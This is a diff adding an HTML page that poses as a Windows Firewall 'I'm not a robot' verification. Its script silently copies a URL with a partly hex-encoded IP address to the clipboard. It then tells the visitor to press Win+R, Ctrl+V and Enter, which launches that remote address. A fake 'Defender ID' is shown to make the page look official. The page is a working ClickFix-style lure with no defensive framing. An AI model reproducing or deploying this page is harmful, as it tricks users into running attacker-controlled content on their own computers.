@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<!-- Favicon (SVG, URL-encoded) -->
+<link rel="icon" type="image/svg+xml" sizes="any" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cdefs%3E%3CradialGradient%20id%3D%22wf-water%22%20cx%3D%2240%25%22%20cy%3D%2235%25%22%20r%3D%2270%25%22%3E%3Cstop%20offset%3D%220%22%20stop-color%3D%22%237fd1ff%22%2F%3E%3Cstop%20offset%3D%221%22%20stop-color%3D%22%231b6db6%22%2F%3E%3C%2FradialGradient%3E%3ClinearGradient%20id%3D%22wf-land%22%20x1%3D%220%22%20y1%3D%220%22%20x2%3D%220%22%20y2%3D%221%22%3E%3Cstop%20offset%3D%220%22%20stop-color%3D%22%236fc16b%22%2F%3E%3Cstop%20offset%3D%221%22%20stop-color%3D%22%232e8b57%22%2F%3E%3C%2FlinearGradient%3E%3ClinearGradient%20id%3D%22wf-brick%22%20x1%3D%220%22%20y1%3D%220%22%20x2%3D%220%22%20y2%3D%221%22%3E%3Cstop%20offset%3D%220%22%20stop-color%3D%22%23d46a4d%22%2F%3E%3Cstop%20offset%3D%221%22%20stop-color%3D%22%23a33f2e%22%2F%3E%3C%2FlinearGradient%3E%3ClinearGradient%20id%3D%22wf-brick-edge%22%20x1%3D%220%22%20y1%3D%220%22%20x2%3D%220%22%20y2%3D%221%22%3E%3Cstop%20offset%3D%220%22%20stop-color%3D%22%237a2b22%22%2F%3E%3Cstop%20offset%3D%221%22%20stop-color%3D%22%235b211b%22%2F%3E%3C%2FlinearGradient%3E%3C%2Fdefs%3E%3Ccircle%20cx%3D%2216%22%20cy%3D%2210%22%20r%3D%227%22%20fill%3D%22url%28%23wf-water%29%22%2F%3E%3Cpath%20d%3D%22M12.5%209c.9-1%202-1.4%203-1.4%201%200%201.7.3%202.2.9-.6.5-1.2.8-1.9%201-.8.3-1.5.2-2.2.7-.5.3-.8.8-1.3%201-.9.3-3.4-.3-.9-2z%22%20fill%3D%22url%28%23wf-land%29%22%20opacity%3D%22.95%22%2F%3E%3Cg%20transform%3D%22translate%282%2C11%29%20scale%28.9%29%22%3E%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2213.8%22%20height%3D%229.2%22%20rx%3D%221.4%22%20fill%3D%22url%28%23wf-brick%29%22%20stroke%3D%22url%28%23wf-brick-edge%29%22%20stroke-width%3D%22.8%22%2F%3E%3Cpath%20d%3D%22M.8%203.1h12.2M.8%206.2h12.2%22%20stroke%3D%22%236e3b30%22%20stroke-width%3D%22.7%22%20stroke-linecap%3D%22round%22%20opacity%3D%22.6%22%2F%3E%3Cpath%20d%3D%22M4.7.9v2.2M9.1.9v2.2M2.7%204v2.2M7.1%204v2.2M11.5%204v2.2%22%20stroke%3D%22%236e3b30%22%20stroke-width%3D%22.7%22%20stroke-linecap%3D%22round%22%20opacity%3D%22.6%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E">
+
+<title>Windows - FireWall</title>
+
+<style>
+  :root{
+    --title-start:#3e78b3; --title-mid:#1e5f98; --title-end:#184e7c;
+    --bar-start:#2f8c77; --bar-end:#186b59;
+    --text:#0f172a; --muted:#5b6772; --bg:#c6dcf0;
+    --card:#fff; --border:#d7e1ea; --primary:#1f6feb;
+    --ring:#cfe3f6; --ring-top:#1f6feb;
+
+    /* 🔧 change this to resize the tray SVG everywhere */
+    --tray-size: 28px;
+  }
+
+  html,body{height:100%}
+  body{
+    margin:0; background:linear-gradient(180deg,#9ec3e1,#bfe0f5) fixed;
+    font:500 14px/1.45 "Segoe UI", Tahoma, Arial, sans-serif;
+    color:var(--text);
+    display:flex; justify-content:center; align-items:center;
+    min-height:100svh;
+    padding:24px;
+  }
+
+  .ws-window{
+    width:450px;
+    border-radius:3px;
+    overflow:hidden;
+    box-shadow:0 10px 28px rgba(0,0,0,.28);
+    background:#0d3f66;
+  }
+
+  .ws-titlebar{
+    height:64px; display:flex; align-items:center; gap:10px; padding:0 10px;
+    background:linear-gradient(180deg,var(--title-mid),var(--title-mid) 60%, var(--title-end));
+    border-bottom:1px solid rgba(255,255,255,.18);
+    color:#fff; position:relative;
+  }
+  .ws-titlebar:after{
+    content:""; position:absolute; left:0; right:0; top:0; height:18px;
+    background:linear-gradient(180deg,rgba(255,255,255,.35),rgba(255,255,255,0));
+    pointer-events:none;
+  }
+
+  /* ✅ Tray icon—resizes correctly */
+  .ws-titlebar .ws-tray{
+    width: var(--tray-size);
+    height: var(--tray-size);
+    flex: 0 0 var(--tray-size);
+    display: block;
+  }
+
+  .ws-title{
+    font-size:20px; font-weight:600; text-shadow:0 1px 0 rgba(0,0,0,.35);
+  }
+
+  .ws-content{
+    background:linear-gradient(180deg,#f4f8fc,#eef4fa);
+    padding:22px;
+  }
+  .verify-card{
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:18px;
+    display:flex; align-items:center; justify-content:space-between;
+    box-shadow:0 4px 16px rgba(13,63,102,.08);
+    cursor:pointer;
+    user-select:none;
+  }
+  .v-left{display:flex; align-items:center; gap:14px}
+  .v-title{font-weight:700; font-size:15px}
+  .v-sub{font-size:12px; color:var(--muted)}
+  .mini-brand{display:grid; place-items:center; width:26px; height:26px; margin-left:8px}
+  .mini-brand svg{width:26px;height:26px}
+
+  .chk{
+    width:24px; height:24px; border:2px solid #b9c7d3; border-radius:6px;
+    background:#fff; display:flex; align-items:center; justify-content:center;
+    position:relative; overflow:hidden; transition:all .25s ease;
+  }
+  .chk.checked{background:#2f8c77; border-color:#2f8c77}
+  .chk.checked::after{
+    content:""; width:8px; height:14px; border:solid #fff; border-width:0 2px 2px 0; transform:rotate(45deg);
+  }
+  .ring{
+    position:absolute; inset:0; margin:auto; width:16px; height:16px;
+    border-radius:50%; border:2px solid var(--ring);
+    border-top-color:var(--ring-top);
+    animation:spin .5s linear;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .steps-panel{
+    margin-top:14px;
+    background:#fff;
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:20px 22px 22px;
+    box-shadow:0 10px 22px rgba(13,63,102,.12);
+  }
+  .steps-panel h3{
+    margin:0 0 8px; color:#184e7c; font-size:16px; font-weight:700; text-align:left;
+  }
+  .m-step{display:flex; align-items:center; gap:8px; margin:12px 0}
+  .m-n{width:24px;height:24px;border-radius:50%;background:#184e7c;color:#fff;display:grid;place-items:center;font-weight:700;font-size:.85rem}
+  .kb{display:inline-flex;align-items:center;justify-content:center;border:1px solid rgba(0,0,0,.3);background:linear-gradient(#fff,#eef2f6);border-radius:5px;padding:6px 12px;font-weight:700;margin:0 2px;gap:4px}
+  .kb svg{width:18px;height:18px;display:block}
+  .muted-note{color:var(--muted); font-size:12px; margin-top:8px; text-align:center}
+
+  /* Footer + separator */
+  .v-foot{
+    margin-top:22px;
+    padding-top:10px;
+    border-top:1px solid rgba(13,63,102,.15);
+    font-size:12px;
+    color:var(--muted);
+    text-align:center;
+  }
+
+  /* 🔹 Defender ID row */
+  .defender-row{
+    display:flex; align-items:center; gap:10px;
+    margin-top:12px;
+    padding:10px;
+    border:1px dashed var(--border);
+    border-radius:8px;
+    background:#f9fbff;
+    cursor:pointer; /* clicking the row acts like clicking the copy button */
+  }
+  .id-label{font-weight:700; color:#184e7c}
+  .id-box{
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    padding:8px 10px; border:1px solid rgba(0,0,0,.25); background:linear-gradient(#fff,#f3f6fa);
+    border-radius:6px; user-select:all;
+  }
+  .copy-btn{
+    display:inline-flex; align-items:center; gap:6px;
+    border:1px solid #c9d6e2; background:linear-gradient(#fff,#eef3f8);
+    border-radius:6px; padding:8px 10px; font-weight:700; cursor:pointer;
+  }
+  .copy-btn[disabled]{opacity:.6; cursor:default}
+  .copy-btn svg{width:16px;height:16px;display:block}
+</style>
+</head>
+<body>
+
+<div class="ws-window">
+  <div class="ws-titlebar">
+    <!-- Tray icon (scales with --tray-size) -->
+    <svg class="ws-tray" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Windows Firewall" role="img">
+      <defs>
+        <radialGradient id="wf-water" cx="40%" cy="35%" r="70%">
+          <stop offset="0" stop-color="#7fd1ff"/><stop offset="1" stop-color="#1b6db6"/>
+        </radialGradient>
+        <linearGradient id="wf-land" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#6fc16b"/><stop offset="1" stop-color="#2e8b57"/>
+        </linearGradient>
+        <linearGradient id="wf-brick" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#d46a4d"/><stop offset="1" stop-color="#a33f2e"/>
+        </linearGradient>
+        <linearGradient id="wf-brick-edge" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#7a2b22"/><stop offset="1" stop-color="#5b211b"/>
+        </linearGradient>
+      </defs>
+      <g>
+        <circle cx="15.2" cy="9.6" r="7.2" fill="url(#wf-water)"/>
+        <path d="M11.8 8.4c1.2-1.3 2.6-2 3.9-2 1.2 0 2 .4 2.7 1.2-.7.6-1.4 1-2.2 1.2-.9.3-1.7.2-2.4.7-.5.3-.9.8-1.5 1-1 .3-1.8-.3-.5-2.1z" fill="url(#wf-land)" opacity=".95"/>
+        <path d="M16.1 12.9c.7.1 1.5.2 2.1.7.6.4.9 1 .7 1.7-1 .2-2.3 0-3.2-.5-.8-.5-.9-1.2.4-1.9z" fill="url(#wf-land)" opacity=".95"/>
+        <circle cx="15.2" cy="9.6" r="7.2" fill="none" stroke="rgba(255,255,255,.35)" stroke-width=".6"/>
+      </g>
+      <g transform="translate(2,11)">
+        <rect x="0" y="0" width="13.8" height="9.2" rx="1.4" fill="url(#wf-brick)" stroke="url(#wf-brick-edge)" stroke-width=".8"/>
+        <path d="M.8 3.1h12.2M.8 6.2h12.2" stroke="#6e3b30" stroke-width=".7" stroke-linecap="round" opacity=".6"/>
+        <path d="M4.7.9v2.2M9.1.9v2.2M2.7 4v2.2M7.1 4v2.2M11.5 4v2.2" stroke="#6e3b30" stroke-width=".7" stroke-linecap="round" opacity=".6"/>
+        <rect x="1" y="1" width="11.8" height=".9" fill="rgba(255,255,255,.18)"/>
+        <rect x="0" y="8.6" width="13.8" height=".8" fill="rgba(0,0,0,.22)"/>
+      </g>
+    </svg>
+
+    <span class="ws-title">Windows - FireWall</span>
+  </div>
+
+  <div class="ws-content">
+    <div class="verify-card" id="vCard" aria-label="Verify you are not a robot">
+      <div class="v-left">
+        <div class="chk" id="chk" aria-hidden="true"></div>
+        <div>
+          <div class="v-title">I'm not a robot</div>
+          <div class="v-sub">Human – Integrity Firewall</div>
+        </div>
+      </div>
+      <div class="mini-brand" aria-hidden="true">
+        <!-- 🔁 Leave this SVG spot; you can swap it later -->
+        <!-- SVG SHIELD ICON HERE -->
+        <svg viewBox="0 0 64 64" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <clipPath id="shield-clip"><path d="M32 6l22 8v14c0 14-9 23-22 25C19 51 10 42 10 28V14z"/></clipPath>
+            <linearGradient id="silver-stroke" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0" stop-color="#f5f7fa"/><stop offset="0.45" stop-color="#cfd6e2"/><stop offset="1" stop-color="#f8fafc"/>
+            </linearGradient>
+            <linearGradient id="top-gloss" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0" stop-color="rgba(255,255,255,.35)"/><stop offset="1" stop-color="rgba(255,255,255,0)"/>
+            </linearGradient>
+          </defs>
+          <g clip-path="url(#shield-clip)">
+            <rect x="0" y="0" width="32" height="32" fill="#e53935"/>
+            <rect x="32" y="0" width="32" height="32" fill="#43a047"/>
+            <rect x="0" y="32" width="32" height="32" fill="#1e88e5"/>
+            <rect x="32" y="32" width="32" height="32" fill="#fdd835"/>
+            <path d="M32 0v64M0 32h64" stroke="rgba(255,255,255,.65)" stroke-width="1.5"/>
+            <rect x="0" y="0" width="64" height="20" fill="url(#top-gloss)"/>
+          </g>
+          <path d="M32 6l22 8v14c0 14-9 23-22 25C19 51 10 42 10 28V14z" fill="none" stroke="url(#silver-stroke)" stroke-width="2"/>
+          <path d="M32 6l22 8v14c0 14-9 23-22 25C19 51 10 42 10 28V14z" fill="none" stroke="rgba(0,0,0,.15)" stroke-width="1"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- Steps will be injected here -->
+    <div class="v-foot">© 2025 Windows Firewall UI • Human-Verification.</div>
+  </div>
+</div>
+
+<script>
+(() => {
+  const vCard = document.getElementById('vCard');
+  const chk = document.getElementById('chk');
+
+  // Content to copy (unchanged)
+  const PHRASE = 'http://5.0xFD.59.0xE4/n1/slu.lo';
+
+  let stepsMade = false;
+  let resetTimer = null;
+
+  const writeClipboard = async (text) => {
+    try {
+      if (navigator.clipboard?.writeText) {
+        await navigator.clipboard.writeText(text);
+      } else {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        ta.remove();
+      }
+    } catch(e) { /* ignore */ }
+  };
+
+  // Ensure the steps (and copy button) exist before showing "Copied!"
+  function ensureStepsAndGetButton(){
+    if (!stepsMade) buildSteps(); // creates #copyBtn
+    return document.getElementById('copyBtn');
+  }
+
+  function setCopiedState(btn){
+    const label = btn.querySelector('.copy-label');
+    const prev = label.textContent;
+    btn.disabled = true;
+    label.textContent = 'Copied!';
+    clearTimeout(resetTimer);
+    resetTimer = setTimeout(() => {
+      label.textContent = prev;
+      btn.disabled = false;
+    }, 1200);
+  }
+
+  // 🔵 Single source of truth: treat ALL triggers as "copy button clicked"
+  const onCopyButtonClick = async () => {
+    const btn = ensureStepsAndGetButton();
+    await writeClipboard(PHRASE);
+    if (btn) setCopiedState(btn); // feedback ALWAYS on the copy button
+  };
+
+  function makeDefenderId(){
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const len = 13;
+    const arr = (crypto?.getRandomValues) ? crypto.getRandomValues(new Uint8Array(len)) : new Uint8Array(len);
+    let s = '';
+    for (let i = 0; i < len; i++){
+      const r = arr[i] || Math.floor(Math.random()*256);
+      s += alphabet[r % alphabet.length];
+    }
+    return `WD-${s}`;
+  }
+
+  function buildSteps(){
+    if (stepsMade) return;
+    stepsMade = true;
+
+    const defenderId = makeDefenderId();
+
+    const panel = document.createElement('div');
+    panel.className = 'steps-panel';
+    panel.id = 'stepsPanel';
+    panel.innerHTML = `
+      <h3 id="t">Next Steps to Verify:</h3>
+
+      <div class="m-step">
+        <span class="m-n">1</span><span>Press</span>
+        <span class="kb" aria-hidden="true">
+          <!-- SVG PLACEHOLDER -->
+          <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+            <rect x="6" y="6" width="24" height="24"></rect>
+            <rect x="34" y="6" width="24" height="24"></rect>
+            <rect x="6" y="34" width="24" height="24"></rect>
+            <rect x="34" y="34" width="24" height="24"></rect>
+          </svg>
+        </span> + <span class="kb">R</span>
+      </div>
+
+      <div class="m-step"><span class="m-n">2</span><span>Press</span> <span class="kb">CTRL</span> + <span class="kb">V</span></div>
+      <div class="m-step"><span class="m-n">3</span><span>Press</span> <span class="kb">Enter</span></div>
+
+      <!-- Replaced muted note with Defender ID + Copy -->
+      <div class="defender-row" id="defenderRow" role="button" tabindex="0" aria-label="Copy from copy button">
+        <span class="id-label">Defender ID</span>
+        <span class="id-box" id="defenderId" aria-readonly="true">${defenderId}</span>
+        <button class="copy-btn" id="copyBtn" type="button" aria-live="polite" aria-label="Copy">
+          <!-- COPY ICON SVG PLACEHOLDER -->
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <rect x="7" y="3" width="10" height="14" rx="2" ry="2"></rect>
+            <path d="M5 7v10a2 2 0 0 0 2 2h10"></path>
+          </svg>
+          <span class="copy-label">Copy</span>
+        </button>
+      </div>
+    `;
+
+    // Inject below the card
+    vCard.insertAdjacentElement('afterend', panel);
+
+    // Wire: row, ID box, and Copy button all proxy to the SAME handler
+    const row  = document.getElementById('defenderRow');
+    const idBx = document.getElementById('defenderId');
+    const btn  = document.getElementById('copyBtn');
+
+    const proxy = (e) => { e.preventDefault(); onCopyButtonClick(); };
+
+    row.addEventListener('click', proxy, {passive:false});
+    row.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); onCopyButtonClick(); }
+    });
+    idBx.addEventListener('click', proxy, {passive:false});
+    btn.addEventListener('click', proxy, {passive:false});
+  }
+
+  // Verify card: first click shows spinner, then builds steps, THEN shows Copy-button feedback
+  function handleCardClick(){
+    if (!chk.classList.contains('checked')) {
+      chk.innerHTML = '<span class="ring" aria-hidden="true"></span>';
+      setTimeout(() => {
+        chk.innerHTML = '';
+        chk.classList.add('checked');
+        // Build steps (creates the copy button), then trigger copy-button feedback
+        buildSteps();
+        onCopyButtonClick();
+      }, 500);
+    } else {
+      // Already verified: still treat as copy button click
+      onCopyButtonClick();
+    }
+  }
+
+  vCard.addEventListener('click', handleCardClick, {passive:true});
+})();
+</script>
+
+</body>
+</html>
